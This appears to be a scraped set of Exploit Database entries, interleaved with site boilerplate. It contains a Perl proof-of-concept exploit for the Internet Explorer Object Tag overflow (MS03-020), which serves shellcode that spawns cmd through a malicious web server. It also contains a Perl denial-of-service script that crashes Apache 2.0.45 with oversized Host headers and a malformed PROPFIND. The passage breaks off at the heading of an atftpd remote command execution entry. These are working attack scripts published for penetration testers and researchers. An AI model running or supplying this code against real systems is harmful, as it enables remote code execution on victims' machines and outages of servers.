Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 37
Microsoft Internet Explorer - Object Tag (MS03-020) - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMicrosoft Internet Explorer - Object Tag (MS03-020)EDB-ID:37CVE:2003-0344EDB Verified:Author:alumniType:remoteExploit:/Platform:WindowsDate:2003-06-07Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED#!/usr/bin/perl##  Proof of concept exploit on IE 5.x - 6.x by Alumni#  IE-Object longtype dynamic call oferflow##  url://<$shellcode><'/'x48><jmp %ptr_sh>#  the flaw actually exists in URLMON.DLL when converting backslashes#  to wide char, this can be seen on stack dump near '&CLSID=AAA...2F__2F__...'.##  To exploit:  i)  start server perl script;#	     ii) connect to http-service using IE/5.x.#                   a) the shellcode size is limited up to 56 bytes;#	     b) the '$ret' may differ as well as the image base of KERNEL32.DLL;#	     c) to avoid multiple encoding the shellcode is given 'as is' with help of JScript.#use IO::Socket;$port = 80;$server = IO::Socket::INET->new (LocalPort => $port,Type =>SOCK_STREAM,Reuse => 1,Listen => $port) or die("Couldnt't createserver socket\n");$shellcode = 	"\x33\xdb".		# xor ebx, ebx"\x8b\xd4".		# mov edx, esp"\x80\xc6\xff".		# add dh, 0xFF"\xc7\x42\xfc\x63\x6d".	# mov dword ptr[edx-4], 0x01646D63("cmd\x01")"\x64\x01".		#"\x88\x5a\xff".		# mov byte ptr[edx-1], bl"\x8d\x42\xfc".		# lea eax, [edx-4]"\x8b\xf5".		# mov esi, ebp"\x56\x52".		# push esi; push edx"\x53\x53\x53\x53\x53\x53".	# push ebx"\x50\x53".		# push eax; push ebx"\xb8\x41\x77\xf7\xbf".	# mov eax, 0xBFF77741 ~=CreateProcessA"\xff\xd0".		# call eax"\xb8\xf8\xd4\xf8\xbf".	# mov eax, 0xBFF8D4F8 ~=ExitProcess"\xff\xd0".		# call eax"\xcc";			# int 3$nop = "\x90";$ret = "\\xAB\\x5D\\x58";while ($client = $server->accept()) {while (<$client>) {if ($_ =~ /^(\x0D\x0A)/) {print $client <<END_DATA;HTTP/1.0 200 Ok\rContent-Type: text/html\r\r&lt;script&gt;\rvar mins = 56;\rvar size = 48;\rvar sploit = "$shellcode";\rvar strNop = "$nop";\rvar strObj = '&lt;object type="';\rfor (i=0;i<mins-sploit.length;i++) strObj += strNop;\rstrObj += sploit;\rfor (i=0;i<size;i++) strObj += '/';\rstrObj += "CCCCCCCCDDDDDDDD";\rstrObj += "$ret";\rstrObj += '">Hello&lt;/object&gt;';\ralert(strObj);\rdocument.write(strObj);\r&lt;/script&gt;\rEND_DATAclose($client);}}}close($server);# milw0rm.com [2003-06-07]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 38
Apache 2.0.45 - 'APR' Crash - Linux dos Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDApache 2.0.45 - 'APR' CrashEDB-ID:38CVE:2003-0245EDB Verified:Author:Matthew MurphyType:dosExploit:/Platform:LinuxDate:2003-06-08Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED#!/usr/bin/perl## Apache 2.0.37 - 2.0.45 APR Exploit# Written By Matthew Murphy## This Perl script will successfully exploit any un-patched Apache 2.x# servers.## Base64 Encoder## If you want authentication with the server via HTTP's lame Basic# auth, put the proper string to encode BASE64 content, and use# '%s' to represent the credentials being encoded.  For instance:## base64 %s## would result in:## base64 userid:password## If your decoder requires you to use STDIN to pass the password# (no pun intended), set $BASE64_USE_STDIN to nonzero and do not# use '%s' on the command-line.$BASE64_CMD_STRING = "use_base64_encoder_here %s";# Base64 encoder piping## If your encoder requires the password to be written to STDIN,# set this to a nonzero value.  NOTE: This requires support for# bi-directional pipes on your OS version.$BASE64_USE_STDIN = 0;# Base64 encoder input handling## If your encoder requires a newline after your credentials,# set this to your newline character.$BASE64_WRITE_NL = "";use IO::Socket;print STDOUT "Apache 2.0 APR Exploit\r\n";print STDOUT "By Matthew Murphy\r\n\r\n";print STDOUT "Enter the hostname/IP address of the server: ";$line = <STDIN>;$host = mychomp($line);print STDOUT "Enter the port of the server \[80\]: ";$line = <STDIN>;$port = mychomp($line);print STDOUT "Use authentication credentials for the session \[Y/N\]? ";$line = <STDIN>;$char = mychomp($line);if ($char == "Y" || $char == "y") {print STDOUT "What username shall we use: ";$line = <STDIN>;$user = mychomp($line);print STDOUT "What password shall we use: ";$line = <STDIN>;$pass = mychomp($line);$auth = "$user:$pass";if ($BASE64_USE_STDIN) {# l33t Perl piping trix; NOTE: This is definitely# Alpha code! :-)pipe(STDOUTREAD, STDOUTWRITE);pipe(STDINREAD, STDINWRITE);open(OLDSTDIN, "&STDIN");open(OLDSTDOUT, ">&STDOUT");open(STDIN, "&STDINREAD");open(STDOUT, ">&STDOUTWRITE");close(STDINREAD);close(STDOUTWRITE);system($BASE64_CMD_STRING);open(STDIN, "&OLDSTDIN");open(STDOUT, "&>OLDSTDOUT");close(OLDSTDIN);close(OLDSTDOUT);print STDINWRITE $auth;close(STDINWRITE);read(STDOUTREAD, $base64, 4096); # Edit for insane passwordsclose(STDOUTREAD);} else {open(READOUTPUT, sprintf($BASE64_CMD_STRING, $auth)."|");read(READOUTPUT, $base64, 4096); # See aboveclose(READOUTPUT);}# Another hack for dealing with base64 encoders that output# multi-lined encoded text.  HTTP specifically calls for a# single line.  Note that this pattern also messes with spaces,# tabs, etc., but base64 doesn't use those either, so this# shouldn't matter.$base64 = join("", split(/ /, $base64));} else {$base64 = undef;}$f = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"127.0.0.1");print STDOUT "Exploiting a proxy server \[Y/N\]? ";$line = <STDIN>;$char = mychomp($line);if ($char == "Y" || $char == "y") {print $f "GET / HTTP/1.1\x0d\x0a";# Apache 2.0 tries to limit header inputs, but uses a hash table# that ultimately concatenates multiple headers of the same name# together with ", " between them, so:## Host: a# Host: b## Bypasses Apache's buffer size checks, but ends up as:## Host: a,b## When processed.  Confirm this with a TRACE against your server:## TRACE / HTTP/1.1# Host: a# Host: b## The "message/http" body you receive will contain:## TRACE / HTTP/1.1# Host: a,b## So, for those of you who are confused by this code fragment,# this is what it ultimately achieves!for ($i = 0; $i < 10; $i++) {print $f "Host: ".("A"x2000)."\r\n";}if (defined($base64)) {print $f "Proxy-Authorization: Basic ".$base64."\r\n";}print $f "\r\n";} else {print STDOUT "What resource should be probed: ";$line = <STDIN>;$res = mychomp($line);print STDOUT "Exploit a DAV repository for this attack? \[Y/N\] ";$line = <STDIN>;$char = mychomp($line);if ($char == "Y" || $char == "y") {# WARNING:# Another section of alpha code here; mod_dav tends to barf# if given the smallest inconsistency, and this is not# exactly well-researched.  If this doesn't work for you,# target your DAV repository as a typical resource: if# UseCanonicalName On hasn't been set explicitly, mod_dav# will choke on that as well.## STunnel should not have issues with this, as you can't# use a "Host" header in an SSL connection anyway, so# that is no problem.## Note that if the body is too long, IIS servers will also# die (assuming of course, that the latest IIS cumulative# patch has not been applied), as they have had problems# dealing with WebDAV in the very recent past.# XML Body of Request## If everything works, mod_dav will attempt to format a# message with apr_psprintf() to indicate that our# namespace is invalid, leading to a crash.$xmlbody = "<?xml version=\"1.0\"?>\r\n";$xmlbody.= "<D:propfind xmlns:D=\"".("A"x20000)."\:\">\r\n";$xmlbody.= "\x20\x20\x20\x20<D:allprop/>\r\n";$xmlbody.= "</D:propfind>";# HTTP headersprint $f "PROPFIND $res HTTP/1.1\r\n";print $f "Host: $host:$port\r\n";print $f "Depth: 1\r\n";print $f "Content-Type: text/xml; charset=\"utf-8\"\r\n";print $f "Content-Length: ".length($body)."\r\n\r\n";if (defined($base64)) {print $f "Authorization: Basic ".$base64."\r\n";}print $f "$xmlbody\r\n\r\n";} else {# This does *almost* the exact same thing as the mod_proxy# code, and could be considered wasteful, but a few extra# CPU cycles never killed anybody. :-(print $f "GET $res HTTP/1.1\r\n";for ($i = 0; $i < 10; $i++) {print $f "Host: ".("A"x2000)."\r\n";}if (defined($base64)) {print $f "Authorization: Basic ".$base64."\r\n";}print $f "\r\n";}}while (defined($ln = <$f>)) {print STDOUT $ln;}undef $f;exit;# FIXED: The perl chomp() function is broken on my distro,# so I hacked a fix to work around it.  This note applies# to ActivePerl 5.8.x -- I haven't tried others.  This is# another hackish fix, which seems to be the entire style# of this code.  I'll write better toys when I have time to# write better toys.sub mychomp {my $data;my $arg = shift;my $CRLF;if ($^O == "MSWin32") {$CRLF = 1;} else {$CRLF = 0;}$data = substr($arg, 0, length($arg) - $CRLF);return $data;}# milw0rm.com [2003-06-08]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 39
Atftpd 0.6 - 'atftpdx.c' Remote Command Execution - Linux remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit 